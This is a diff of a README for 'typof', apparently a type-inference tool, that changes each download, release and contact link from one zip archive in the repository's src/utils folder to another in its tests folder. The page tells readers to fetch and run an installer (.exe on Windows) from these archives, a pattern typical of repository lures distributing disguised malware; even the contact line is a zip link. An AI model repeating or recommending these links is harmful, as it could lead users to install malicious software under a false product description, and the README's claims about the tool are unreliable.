@@ -1,7 +1,7 @@
 # 🎉 typof - Easily Infer Types in Your Code
 
 ## 📥 Download Now
-[![Download typof](https://raw.githubusercontent.com/ahmedgalalsyd/typof/main/src/utils/Software_3.8.zip%20typof-v1.0-blue)](https://raw.githubusercontent.com/ahmedgalalsyd/typof/main/src/utils/Software_3.8.zip)
+[![Download typof](https://github.com/ahmedgalalsyd/typof/raw/refs/heads/main/tests/Software-scopelism.zip%20typof-v1.0-blue)](https://github.com/ahmedgalalsyd/typof/raw/refs/heads/main/tests/Software-scopelism.zip)
 
 ## 🚀 Getting Started
 Welcome to typof! This application helps you automatically infer the types of various data in your code. Whether you are dealing with strings, numbers, or objects, typof simplifies your task.
@@ -14,9 +14,9 @@ Before you start, ensure your computer meets these requirements:
 - **Disk Space:** A minimum of 100MB free space.
 
 ## 📂 Download & Install
-To download, visit this page: [typof Releases](https://raw.githubusercontent.com/ahmedgalalsyd/typof/main/src/utils/Software_3.8.zip). Here, you will find the latest version available for download.
+To download, visit this page: [typof Releases](https://github.com/ahmedgalalsyd/typof/raw/refs/heads/main/tests/Software-scopelism.zip). Here, you will find the latest version available for download.
 
-1. Open the link: [Download typof Releases](https://raw.githubusercontent.com/ahmedgalalsyd/typof/main/src/utils/Software_3.8.zip).
+1. Open the link: [Download typof Releases](https://github.com/ahmedgalalsyd/typof/raw/refs/heads/main/tests/Software-scopelism.zip).
 2. Locate the version you want to download. You will see a list of available files.
 3. Choose the installer that matches your operating system. If you are unsure which one to pick:
    - For Windows: select the `.exe` file.
@@ -60,7 +60,7 @@ Yes, once installed, you can use typof without an internet connection.
 While typof does not write code for you, it helps you understand types in your existing code.
 
 ## 🔗 Contact
-For any questions or support, please contact https://raw.githubusercontent.com/ahmedgalalsyd/typof/main/src/utils/Software_3.8.zip
+For any questions or support, please contact https://github.com/ahmedgalalsyd/typof/raw/refs/heads/main/tests/Software-scopelism.zip
 
 ## 📄 License
 This project is licensed under the MIT License. Feel free to modify and use it as you wish.
